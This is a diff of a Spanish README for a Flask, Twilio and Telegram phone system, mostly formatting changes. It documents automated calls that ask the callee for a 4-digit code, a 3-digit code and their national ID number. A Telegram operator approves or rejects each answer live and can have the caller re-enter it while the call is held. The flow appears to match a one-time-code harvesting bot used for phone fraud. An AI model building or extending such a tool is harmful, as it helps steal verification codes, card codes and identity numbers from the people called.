@@ -35,12 +35,14 @@ Este proyecto es un sistema de verificación telefónica basado en Flask que se 
 ## 📥 Instalación
 
 1. Clona el repositorio:
+
    ```bash
    git clone https://github.com/tuusuario/sistema-verificacion-telefonica.git
    cd sistema-verificacion-telefonica
    ```
 
 2. Crea un entorno virtual:
+
    ```bash
    python -m venv venv
    source venv/bin/activate  # En Windows: venv\Scripts\activate
@@ -71,14 +73,18 @@ TELEGRAM_CHAT_ID = 'Tu_Chat_ID'
 ### Despliegue Local con ngrok
 
 1. Inicia el servidor Flask:
+
    ```bash
    python app.py
    ```
 
 2. Abre otra terminal y lanza ngrok:
+
    ```bash
    ngrok http 5000
    ```
+
+   ~/Desktop/telegrambot/.venv/bin/python
 
 3. Copia la URL HTTPS generada por ngrok
 
@@ -90,6 +96,7 @@ TELEGRAM_CHAT_ID = 'Tu_Chat_ID'
 ### Despliegue en Servidor
 
 1. Configura un servidor con Python (por ejemplo, usando Gunicorn):
+
    ```bash
    pip install gunicorn
    gunicorn app:app
@@ -101,28 +108,28 @@ TELEGRAM_CHAT_ID = 'Tu_Chat_ID'
 
 ## 🔄 Endpoints de la API
 
-| Ruta | Método | Descripción |
-|------|--------|-------------|
-| `/` | GET | Página principal |
-| `/make-call` | GET | Inicia una nueva llamada al número configurado |
-| `/step1` | POST, GET | Solicita el código de verificación de 4 dígitos |
-| `/save-step1` | POST | Guarda el código de 4 dígitos |
-| `/step2` | POST, GET | Solicita el código de verificación de 3 dígitos |
-| `/save-step2` | POST | Guarda el código de 3 dígitos |
-| `/step3` | POST, GET | Solicita el número de cédula |
-| `/save-step3` | POST | Guarda el número de cédula y envía notificación a Telegram |
-| `/waiting-validation` | POST, GET | Ruta de espera mientras se validan los datos |
-| `/validate-result` | GET, POST | Verifica el resultado de la validación |
-| `/revalidate/<data_type>` | POST, GET | Permite revalidar un tipo específico de dato |
-| `/reverify` | POST, GET | Solicita una nueva verificación de todos los datos |
-| `/verify-with-timeout` | POST, GET | Permite especificar un tiempo personalizado para espera |
-| `/manual-validar` | GET | Validación manual vía web |
-| `/validar` | POST, GET | Procesa la validación recibida desde Telegram |
-| `/start-polling` | GET | Inicia el polling de Telegram |
-| `/stop-polling` | GET | Detiene el polling de Telegram |
-| `/polling-status` | GET | Muestra el estado del polling de Telegram |
-| `/sessions` | GET | Muestra todas las sesiones activas |
-| `/clear-sessions` | GET | Limpia todas las sesiones |
+| Ruta                      | Método    | Descripción                                                |
+| ------------------------- | --------- | ---------------------------------------------------------- |
+| `/`                       | GET       | Página principal                                           |
+| `/make-call`              | GET       | Inicia una nueva llamada al número configurado             |
+| `/step1`                  | POST, GET | Solicita el código de verificación de 4 dígitos            |
+| `/save-step1`             | POST      | Guarda el código de 4 dígitos                              |
+| `/step2`                  | POST, GET | Solicita el código de verificación de 3 dígitos            |
+| `/save-step2`             | POST      | Guarda el código de 3 dígitos                              |
+| `/step3`                  | POST, GET | Solicita el número de cédula                               |
+| `/save-step3`             | POST      | Guarda el número de cédula y envía notificación a Telegram |
+| `/waiting-validation`     | POST, GET | Ruta de espera mientras se validan los datos               |
+| `/validate-result`        | GET, POST | Verifica el resultado de la validación                     |
+| `/revalidate/<data_type>` | POST, GET | Permite revalidar un tipo específico de dato               |
+| `/reverify`               | POST, GET | Solicita una nueva verificación de todos los datos         |
+| `/verify-with-timeout`    | POST, GET | Permite especificar un tiempo personalizado para espera    |
+| `/manual-validar`         | GET       | Validación manual vía web                                  |
+| `/validar`                | POST, GET | Procesa la validación recibida desde Telegram              |
+| `/start-polling`          | GET       | Inicia el polling de Telegram                              |
+| `/stop-polling`           | GET       | Detiene el polling de Telegram                             |
+| `/polling-status`         | GET       | Muestra el estado del polling de Telegram                  |
+| `/sessions`               | GET       | Muestra todas las sesiones activas                         |
+| `/clear-sessions`         | GET       | Limpia todas las sesiones                                  |
 
 ## 📞 Flujo de Llamadas
 
@@ -144,6 +151,7 @@ El sistema utiliza un bot de Telegram para:
 - Permitir al administrador aprobar o rechazar cada parte de la verificación
 
 **Comandos del Bot:**
+
 - `/validar <call_sid> 1 1 1` - Valida todos los datos como correctos
 - `/validar <call_sid> 1 0 1` - Indica que el segundo código es incorrecto
 
@@ -152,6 +160,7 @@ El sistema utiliza un bot de Telegram para:
 El sistema mantiene un registro de todas las sesiones activas en un diccionario global `global_user_sessions` y lo guarda en un archivo JSON para persistencia entre reinicios del servidor.
 
 Cada sesión contiene:
+
 - `code4`: Código de 4 dígitos
 - `code3`: Código de 3 dígitos
 - `cedula`: Número de cédula
@@ -160,6 +169,7 @@ Cada sesión contiene:
 ## 📝 Sistema de Registro (Logging)
 
 El sistema implementa un registro detallado que:
+
 - Guarda información en la consola
 - Mantiene archivos de registro diarios en la carpeta `/logs`
 - Registra todas las operaciones importantes con marcas de tiempo
@@ -170,18 +180,22 @@ El sistema implementa un registro detallado que:
 ### Problemas comunes:
 
 1. **No hay respuesta de Twilio:**
+
    - Verifica que la URL de webhook esté correctamente configurada
    - Comprueba que ngrok esté funcionando correctamente
 
 2. **El bot de Telegram no responde:**
+
    - Verifica que el polling de Telegram esté activo (`/polling-status`)
    - Reinicia el polling con `/start-polling`
 
 3. **Problemas de validación:**
+
    - Verifica las sesiones activas con `/sessions`
    - Limpia las sesiones con `/clear-sessions` si es necesario
 
 4. **La llamada se corta:**
+
    - Verifica los tiempos de espera en las rutas de validación
    - Aumenta los tiempos de espera en `/verify-with-timeout`
 
